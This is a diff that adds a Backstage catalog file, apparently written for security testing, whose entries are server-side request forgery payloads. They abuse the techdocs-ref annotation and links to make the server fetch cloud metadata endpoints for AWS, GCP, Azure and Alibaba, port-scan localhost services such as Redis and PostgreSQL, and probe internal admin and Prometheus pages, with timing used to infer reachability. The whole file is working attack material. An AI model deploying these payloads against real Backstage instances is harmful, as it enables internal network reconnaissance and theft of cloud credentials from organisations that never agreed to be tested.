@@ -1,0 +1,154 @@
+# Técnica 1: Timing-based detection
+# Si el servidor PUEDE alcanzar metadata, responderá rápido
+# Si NO puede, habrá timeout
+
+apiVersion: backstage.io/v1alpha1
+kind: Component
+metadata:
+  name: ssrf-timing-metadata-reachable
+  title: Timing Test - Metadata Reachable
+  description: Fast response indicates metadata is reachable
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://169.254.169.254/latest/meta-data/
+spec:
+  type: service
+  lifecycle: experimental
+  owner: security-team
+
+---
+apiVersion: backstage.io/v1alpha1
+kind: Component
+metadata:
+  name: ssrf-timing-invalid-ip
+  title: Timing Test - Invalid IP
+  description: Slow response/timeout indicates IP is not reachable
+  annotations:
+    github.com/project-slug: newuserx00/business
+    # IP que definitivamente no existe
+    backstage.io/techdocs-ref: url:http://192.0.2.1/test
+spec:
+  type: service
+  lifecycle: experimental
+  owner: security-team
+
+---
+# Técnica 2: Port scanning via SSRF
+apiVersion: backstage.io/v1alpha1
+kind: Component
+metadata:
+  name: ssrf-port-scan-80
+  title: Port Scan - HTTP (80)
+  description: Check if port 80 is open on localhost
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://127.0.0.1:80/
+spec:
+  type: service
+  lifecycle: experimental
+  owner: security-team
+
+---
+apiVersion: backstage.io/v1alpha1
+kind: Component
+metadata:
+  name: ssrf-port-scan-8080
+  title: Port Scan - Alt HTTP (8080)
+  description: Check if port 8080 is open on localhost
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://127.0.0.1:8080/
+spec:
+  type: service
+  lifecycle: experimental
+  owner: security-team
+
+---
+apiVersion: backstage.io/v1alpha1
+kind: Component
+metadata:
+  name: ssrf-port-scan-6379
+  title: Port Scan - Redis (6379)
+  description: Check if Redis is accessible
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://127.0.0.1:6379/
+spec:
+  type: service
+  lifecycle: experimental
+  owner: security-team
+
+---
+apiVersion: backstage.io/v1alpha1
+kind: Component
+metadata:
+  name: ssrf-port-scan-5432
+  title: Port Scan - PostgreSQL (5432)
+  description: Check if PostgreSQL is accessible
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://127.0.0.1:5432/
+spec:
+  type: service
+  lifecycle: experimental
+  owner: security-team
+
+---
+# Técnica 3: Internal service discovery
+apiVersion: backstage.io/v1alpha1
+kind: Component
+metadata:
+  name: ssrf-internal-admin
+  title: Internal Admin Panel
+  description: Attempt to reach internal admin
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://localhost:8080/admin
+spec:
+  type: service
+  lifecycle: experimental
+  owner: security-team
+
+---
+apiVersion: backstage.io/v1alpha1
+kind: Component
+metadata:
+  name: ssrf-internal-metrics
+  title: Internal Metrics
+  description: Attempt to reach Prometheus metrics
+  annotations:
+    github.com/project-slug: newuserx00/business
+    backstage.io/techdocs-ref: url:http://localhost:9090/metrics
+spec:
+  type: service
+  lifecycle: experimental
+  owner: security-team
+
+---
+# Técnica 4: Cloud metadata (todas las nubes)
+apiVersion: backstage.io/v1alpha1
+kind: Component
+metadata:
+  name: ssrf-cloud-metadata-all
+  title: All Cloud Metadata Test
+  description: Testing AWS, GCP, Azure metadata endpoints
+  annotations:
+    github.com/project-slug: newuserx00/business
+    # AWS
+    backstage.io/techdocs-ref: url:http://169.254.169.254/latest/meta-data/
+  links:
+    # GCP
+    - url: http://metadata.google.internal/computeMetadata/v1/
+      title: GCP Metadata
+    # Azure
+    - url: http://169.254.169.254/metadata/instance?api-version=2021-02-01
+      title: Azure Metadata
+    # Alibaba Cloud
+    - url: http://100.100.100.200/latest/meta-data/
+      title: Alibaba Metadata
+  tags:
+    - multi-cloud
+spec:
+  type: service
+  lifecycle: experimental
+  owner: security-team
